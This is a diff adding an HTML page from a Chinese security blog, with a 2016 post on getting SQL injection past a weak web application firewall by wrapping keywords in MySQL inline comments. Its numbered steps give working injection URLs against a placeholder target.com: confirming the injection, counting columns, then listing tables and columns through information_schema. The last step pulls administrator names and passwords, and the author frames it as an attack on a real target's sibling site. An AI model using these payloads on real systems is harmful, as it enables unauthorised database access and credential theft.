@@ -1,0 +1,280 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <!--Description-->
+    
+        <meta name="description" content="知道自己想要做什么,比怎么做更重要">
+    
+
+    <!--Author-->
+    
+        <meta name="author" content="klion">
+    
+
+    <!--Open Graph Title-->
+    
+        <meta property="og:title" content="bypass waf入门之sql注入篇 [ 内联注释 ]"/>
+    
+
+    <!--Open Graph Description-->
+    
+        <meta property="og:description" content="知道自己想要做什么,比怎么做更重要" />
+    
+
+    <!--Open Graph Site Name-->
+    <meta property="og:site_name" content="klion&#39;s blog"/>
+
+    <!--Type page-->
+    
+        <meta property="og:type" content="article" />
+    
+
+    <!--Page Cover-->
+    
+
+    <meta name="twitter:card" content="summary" />
+    
+
+    <!-- Title -->
+    
+    <title>bypass waf入门之sql注入篇 [ 内联注释 ] - klion&#39;s blog</title>
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">
+
+    <!-- Custom Fonts -->
+    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- Gallery -->
+    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/style.css">
+
+    <!-- Google Analytics -->
+    
+
+
+</head>
+
+
+<body>
+
+<div class="bg-gradient"></div>
+<div class="bg-pattern"></div>
+
+<!-- Menu -->
+<!--Menu Links and Overlay-->
+<div class="menu-bg">
+    <div class="menu-container">
+        <ul>
+            
+            <li class="menu-item">
+                <a href="/">
+                    主页
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/archives">
+                    所有文章
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/about">
+                    关于自己
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/tags">
+                    标签
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/categories">
+                    分类
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/contact">
+                    一起交流
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+</div>
+
+<!--Hamburger Icon-->
+<nav>
+    <a href="#menu"></a>
+</nav>
+
+<div class="container">
+
+    <!-- Main Content -->
+    <div class="row">
+    <div class="col-sm-12">
+
+        <!--Title and Logo-->
+        <header>
+    <div class="logo">
+        <a href="/"><i class="logo-icon fa fa-cube" aria-hidden="true"></i></a>
+        
+    </div>
+</header>
+
+        <section class="main">
+            
+<div class="post">
+
+    <div class="post-header">
+        <h1 class="title">
+            <a href="/2016/05/20/bypass-waf-note/">
+                bypass waf入门之sql注入篇 [ 内联注释 ]
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2016-05-20</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/bypasswaf/">bypasswaf</a>
+                </span>
+            
+        </div>
+    </div>
+
+    <div class="content">
+
+        <!-- Gallery -->
+        
+
+        <!-- Post Content -->
+        <h5 id="昨天在搞目标的旁站时凑巧碰到了waf-当然啦-这个waf比较弱-基本是弱到没朋友的那种-但为了博客的完整性-这里还是顺便就记录一下-留给有需要的朋友-方法非常简单-关于bypass-waf的东西其实特别多-这里暂时只提一种-”内联注释”-早已经烂大街了-后续再遇到其它的bypass实例-也会继续更新到博客上-废话少说-看实例吧"><a href="#昨天在搞目标的旁站时凑巧碰到了waf-当然啦-这个waf比较弱-基本是弱到没朋友的那种-但为了博客的完整性-这里还是顺便就记录一下-留给有需要的朋友-方法非常简单-关于bypass-waf的东西其实特别多-这里暂时只提一种-”内联注释”-早已经烂大街了-后续再遇到其它的bypass实例-也会继续更新到博客上-废话少说-看实例吧" class="headerlink" title="昨天在搞目标的旁站时凑巧碰到了waf,当然啦,这个waf比较弱,基本是弱到没朋友的那种,但为了博客的完整性,这里还是顺便就记录一下,留给有需要的朋友,方法非常简单,关于bypass waf的东西其实特别多,这里暂时只提一种,”内联注释”,早已经烂大街了,后续再遇到其它的bypass实例,也会继续更新到博客上,废话少说,看实例吧:"></a>昨天在搞目标的旁站时凑巧碰到了waf,当然啦,这个waf比较弱,基本是弱到没朋友的那种,但为了博客的完整性,这里还是顺便就记录一下,留给有需要的朋友,方法非常简单,关于bypass waf的东西其实特别多,这里暂时只提一种,”内联注释”,早已经烂大街了,后续再遇到其它的bypass实例,也会继续更新到博客上,废话少说,看实例吧:</h5><p><br><br>1, 依旧是先判断注入点是否存在,很显然,’and’没有拦<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://www.target.com/news/show1.php?id=1102 And 1212=1212  返回正常</div><div class="line">http://www.target.com/news/show1.php?id=1102 And 1212=121   返回异常,注入存在</div></pre></td></tr></table></figure></p>
+<p><img src="/img/waf test.png" alt="&#39;&#39;"><br><img src="/img/waf test 1.png" alt="&#39;&#39;"><br></p>
+<p>2,我们观察到,当字段个数为11的时候页面返回正常,说明当前表字段个数为11个,’order by’ 也没有拦,到这里为止,凭着一点经验自己心里就有种感觉,这个waf肯定非常好过,接着往下看吧<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/www.target.com/news</span><span class="regexp">/show1.php?id=1102 OrDer by 11</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/waf test order by .png" alt="&#39;&#39;"><br></p>
+<p>3,开始搜集信息,这时我们发现waf似乎开始起作用了,拦了我们的内置函数<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/www.target.com/news</span><span class="regexp">/show1.php?id=1102 And 1=12 +UNION+ALL+SELECT+1,2,user(),version(),database(),6,7,8,9,10,11 --+-</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/waf test lanjie.png" alt="&#39;&#39;"><br></p>
+<p>4,既然拦了函数,咱们就把函数给注释一下看看,然后这么通过了,好吧,既然它对/!**/这种内联注释感冒,那后面我就把所有的关键字都用这种方式包起来,省的我一个个猜它到底拦哪个<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/www.target.com/news</span><span class="regexp">/show1.php?id=1102 And 1=12 +UNION+ALL+SELECT+1,2,/</span>*!user()*<span class="regexp">/,version(),database(),6,7,8,9,10,11 --+-</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/waf version bypass.png" alt="&#39;&#39;"><br></p>
+<p>5,查询当前库中的所有表,这类我们看到了’t_admin’这张管理表<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/www.target.com/news</span><span class="regexp">/show1.php?id=1102 aNd 1=12 +/</span>*!UNION+ALL+SELECT*<span class="regexp">/+1,2,/</span>*!group_concat(table_name)*<span class="regexp">/,/</span>*!version()*<span class="regexp">/,/</span>*!database()*<span class="regexp">/,6,7,8,9,10,11 from /</span>*!information_schema.tables*<span class="regexp">/ /</span>*!where*<span class="regexp">/ /</span>*!table_schema*<span class="regexp">/=0x686e797075686b315f7363686f6f6c --+-</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/waf version bypass admin.png" alt="&#39;&#39;"><br></p>
+<p>6,查询’t_admin’表中的所有字段名,如下<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/www.target.com/news</span><span class="regexp">/show1.php?id=1102 ANd 1=12 +/</span>*!UNION+ALL+SELECT*<span class="regexp">/+1,2,/</span>*!group_concat(column_name)*<span class="regexp">/,/</span>*!version()*<span class="regexp">/,/</span>*!database()*<span class="regexp">/,6,7,8,9,10,11 from /</span>*!information_schema.columns*<span class="regexp">/ /</span>*!where*<span class="regexp">/ /</span>*!table_name*<span class="regexp">/=0x745f61646d696e --+-</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/waf version bypass columns.png" alt="&#39;&#39;"><br></p>
+<p>7,就剩最后一步了,查出管理员的账号密码即可<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/www.target.com/news</span><span class="regexp">/show1.php?id=1102 anD 1=12 +/</span>*!UNION+ALL+SELECT*<span class="regexp">/+1,2,/</span>*!admin_name*<span class="regexp">/,/</span>*!admin_password*<span class="regexp">/,5,6,7,8,9,10,11 from /</span>*!t_admin*<span class="regexp">/ /</span>*!limit*<span class="regexp">/ 0,1--+-</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/waf version bypass data.png" alt="&#39;&#39;"><br><br><br></p>
+<h5 id="小结"><a href="#小结" class="headerlink" title="小结:"></a>小结:</h5><p>&nbsp;&nbsp;&nbsp;&nbsp;没什么技术含量,只是为了博客完整性稍作记录而已,关于bypass waf后续还会有很多的篇幅来说明,待续……<br></p>
+
+    </div>
+
+    
+
+    
+        <div class="post-tags">
+            <i class="fa fa-tags" aria-hidden="true"></i>
+            <a href="/tags/bypasswaf/">#bypasswaf</a>
+        </div>
+    
+
+    <!-- Comments -->
+    
+
+</div>
+        </section>
+
+    </div>
+</div>
+
+</div>
+
+<!-- Footer -->
+<div class="push"></div>
+
+<footer class="footer-content">
+    <div class="container">
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <ul class="list-inline footer-social-icons">
+                    
+                    <li class="list-inline-item">
+                        <a href="https://github.com/klionsec">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-github"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="mailto:klionsec@gmail.com">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-envelope-o"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <div class="footer-copyright">
+                    <h2>blog by klion</h2>
+                </div>
+            </div>
+        </div>
+    </div>
+</footer>
+
+
+<!-- After footer scripts -->
+
+<!-- jQuery -->
+<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>
+
+<!-- Tween Max -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>
+
+<!-- Gallery -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>
+
+<!-- Custom JavaScript -->
+<script src="/js/main.js"></script>
+
+<!-- Disqus Comments -->
+
+
+
+</body>
+
+</html>
